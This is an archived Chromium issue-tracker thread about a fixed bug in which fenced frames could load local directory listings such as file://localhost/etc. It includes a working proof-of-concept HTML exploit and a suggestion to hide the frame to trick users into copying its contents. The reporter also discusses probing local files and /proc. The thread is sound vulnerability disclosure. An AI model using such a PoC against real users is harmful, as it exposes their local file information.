# FencedFrame allows loading local file directories in http(s?) context

| Field | Value |
|-------|-------|
| **Issue ID** | [368628042](https://issues.chromium.org/issues/368628042) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>FencedFrames |
| **Platforms** | Fuchsia, Linux, Mac, Windows |
| **Chrome Version** | 129.0.0.0 |
| **Reporter** | so...@proton.me |
| **Assignee** | lb...@google.com |
| **Created** | 2024-09-21 |
| **Bounty** | $2,000.00 |

## Description

# Steps to reproduce the problem

1. Enable fenced frame for your PoC server (#privacy-sandbox-enrollment-overrides flag, add your PoC server domain to this list; or do PoC on websites where fencedframe usage is allowed by default)
2. serve exploit.html file, navigate to //$my\_poc\_server\_url/exploit.html
3. observe fencedframe displaying file:///etc folder

PoC (exploit.html)

```
<body>
  <script>
    (async function start() {
      var frame = document.body.appendChild(document.createElement("fencedframe"))
      frame.setAttribute("height", "600")
      frame.setAttribute("width", "600")
      // we can make the iframe not visible to user to trick them into running cmd+a + cmd+c to steal the contents of the folder through clipboard
      // frame.setAttribute('style', `position: absolute; left: -2000; width: 5000px; height: 5000px;`)

      const blob = new Blob([``], { type: 'text/javascript' });
      const blobURL = URL.createObjectURL(blob);
      await window.sharedStorage.worklet.addModule(blobURL);
      var fencedFrameConfig = await window.sharedStorage.selectURL(
        'ab-testing',
        [
          { url: "file://localhost/etc" },
        ],
        {
          resolveToConfig: true
        }
      );
      frame.config = fencedFrameConfig;
    }());
  </script>
</body>

```
# Problem Description

any *://localhost/* URI is a valid fenced frame URI
<https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/common/fenced_frame/fenced_frame_utils.cc;l=19>

```
bool IsValidFencedFrameURL(const GURL& url) {
  if (!url.is_valid())
    return false;
  return (url.SchemeIs(url::kHttpsScheme) || url.IsAboutBlank() ||
          net::IsLocalhost(url)) && // <--------- does not check for protocol
         !url.parsed_for_possibly_invalid_spec().potentially_dangling_markup;
}

```

Why can't we load file://localhost/etc/passwd then? (theory, I've not confirmed it yet)
<https://source.chromium.org/chromium/chromium/src/+/main:content/browser/renderer_host/navigation_request.cc;l=4482-4501?q=%22Supports-Loading-Mode%20HTTP%20response%20header%22&ss=chromium%2Fchromium%2Fsrc>

response to request for file directories has no headers, I suspect (not confirmed yet) that's why `should_enforce_fenced_frame_opt_in` evaluates to false and the error is not thrown.

```
const bool should_enforce_fenced_frame_opt_in =
      response_should_be_rendered_ && response_head_->headers &&
      frame_tree_node_->IsInFencedFrameTree() &&
      !(url.IsAboutBlank() || url.SchemeIsBlob() ||
        url.SchemeIs(url::kDataScheme));
  if (should_enforce_fenced_frame_opt_in &&
      !IsOptedInFencedFrame(*response_head_->headers)) 

```

Version
affects both stable and canary

# Summary

FencedFrame allows loading local file directories in http(s?) context

# Custom Questions

#### Reporter credit:

someoneverycurious

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: N/A

## Attachments

- [variations.txt](attachments/variations.txt) (text/plain, 66.2 KB)
- [Screen Recording 2024-09-21 at 15.54.11.mov](attachments/Screen Recording 2024-09-21 at 15.54.11.mov) (video/quicktime, 33.5 MB)
- [fencedframe_copy.html](attachments/fencedframe_copy.html) (text/html, 1022 B)

## Timeline

### so...@proton.me (2024-09-24)

it's also possible to trigger /proc FS on Linux using this bug. because the check for headers happen AFTER the file is resolved.

### li...@chromium.org (2024-09-24)

So overall I think it's not super great that FencedFrames can load localhost/etc, but there is still other validation to prevent reading more sensitive files. I did notice that while the /etc directory is loaded, individual files still could not be read.

`IsValidFencedFrameURL` just validates the URL is using a valid scheme, there is further validation done on the URL outside of this method.

I'm going to tentatively set this to medium for now.

### pe...@google.com (2024-09-25)

Setting milestone because of s2 severity.

### pe...@google.com (2024-09-25)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### al...@chromium.org (2024-09-25)

Thanks for the report! This does seem like a bug to me. The net::IsLocalhost() check was introduced in <https://crrev.com/c/3627924> and the intent was to only allow <http://localhost> URLs; see [issue 40224641](https://issues.chromium.org/issues/40224641) (and [issue 40834046](https://issues.chromium.org/issues/40834046), where fenced frames were originally restricted to https and about:blank URLs after a similar report showed how they could navigate to an invalid scheme). So I think it needs to be strengthened to disallow file URLs (which could indeed have a host); it doesn't seem like fenced frames should be able to load them.

lbrady@ and shivanisha@ should be able to comment about which flags would currently be required for fenced frames to be enabled.

Re: headers. Generally, Fenced frames can only load content that has a Supports-Loading-Mode response header, with the exception of (1) responses that have no headers and (2) about/data/blob URLs. Looking at how file URLs load in DevTools, it looks like the reporter is right that file URLs that point to individual files do carry a couple of response headers (Content-Type and Last-Modified), while those for directories do not and hence hit the exception in (1). I've checked that this is true on Linux, Mac, and Windows. So this header check is a nice mitigating factor that would block FFs from loading individual files, though listing (possibly sensitive) directories is still not great.

I'm also curious if (1) other features might be inadvertently allowing file://localhost/etc URLs since net::IsLocalhost() usage is pretty widespread, and (2) why our normal mechanisms that disallow web content from navigating to local resources like file URLs aren't kicking in and producing a "Not allowed to load local resource" error in blink (maybe this is just due to how FFs navigations are plumbed).

### so...@proton.me (2024-09-25)

RE: FLAGS
> should be able to comment about which flags would currently be required for fenced frames to be enabled.

Well, technically, no flags are required, because you can apply for private aggregation OR exploit XSS on some of those websites: https://github.com/privacysandbox/attestation/blob/main/enrollment_report.csv 

Re: content loading. the response is not returned for file://realfile (cause of headers) but technically, **the request happens!** Therefore, we can use this as a primitive to check for non-existing files and as I said: trigger /proc FS (***but it can crash processes! ***).
> it's also possible to trigger /proc FS on Linux using this bug. because the check for headers happen AFTER the file is resolved.

I'll try to craft a PoC that may crash processes by iterating over `/proc/$pid/$something`... 

### so...@proton.me (2024-09-25)

nvm I missed the "existing same-site(!) processes" part
~~Hey Chrome experts!
I found this in <https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md>:~~

~~> Aggressive Reuse: For some cases (including on Android), Chromium will aggressively look for existing **same-site processes** to reuse even before reaching the process limit. Out-of-process iframes (OOPIFs) and fenced frames use this approach, such that an example.com iframe in a cross-site page will be placed in an existing example.com process (in any browsing context group), even if the process limit has not been reached. This keeps the process count lower, based on the assumption that most iframes/fenced frames are less resource demanding than top-level documents. Similarly, ServiceWorkers are generally placed in the same process as a document that is likely to rely on them.~~

~~\*\*Does that mean this bug allows embedding process with "file://" site into the embedder process? If so, does that mean it violate Site Isolation? (if it actually allows loading file:/// into http:// context)~~

### lb...@google.com (2024-09-26)

I'm on code health rotation this week, but I'll be able to take a look next week. The fix shouldn't be too complicated; it will need to check the scheme alongside the localhost check for that case.

### ap...@google.com (2024-10-15)

Project: chromium/src  

Branch: main  

Author: Liam Brady <[lbrady@google.com](mailto:lbrady@google.com)>  

Link:      <https://chromium-review.googlesource.com/5902121>

Fenced frame: Prevent file://localhost/\* files from loading.

---


Expand for full commit details
```
Fenced frame: Prevent file://localhost/* files from loading.

Fenced frames are meant to be able to load the following URLs with a
default constructor:
- about:blank URLs
- https://* URLs
- http://localhost URLs

The `net::IsLocalhost()` check that is currently being used for the last
case is only checking that the URL starts with "localhost", not that
the scheme is http/https. This allows the fenced frame to load URLs like file://localhost/path/to/file. This CL tightens the check to also
check that the scheme is HTTP. The "https://localhost/*" case will
still be covered by the "https://*" check.

Bug: 368628042
Change-Id: If53573f5701c28e5674ecb524191cddc12b950fe
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5902121
Reviewed-by: Shivani Sharma <shivanisha@chromium.org>
Commit-Queue: Liam Brady <lbrady@google.com>
Cr-Commit-Position: refs/heads/main@{#1368957}

```

---

Files:

- M `third_party/blink/common/fenced_frame/fenced_frame_utils.cc`
- M `third_party/blink/renderer/core/html/fenced_frame/html_fenced_frame_element_test.cc`
- A `third_party/blink/web_tests/external/wpt/fenced-frame/http-localhost-url.https.html`

---

Hash: 3505b15143306c95caf36552fef3992271d6b04e  

Date:  Tue Oct 15 19:43:24 2024


---

### pe...@google.com (2024-10-16)

lbrady: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### sp...@google.com (2024-11-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
report of lower impact user information disclosure


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-11-15)

Congratulations someoneverycurious! Thank you for your efforts and reporting this issue to us.

### pe...@google.com (2025-01-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/368628042)*
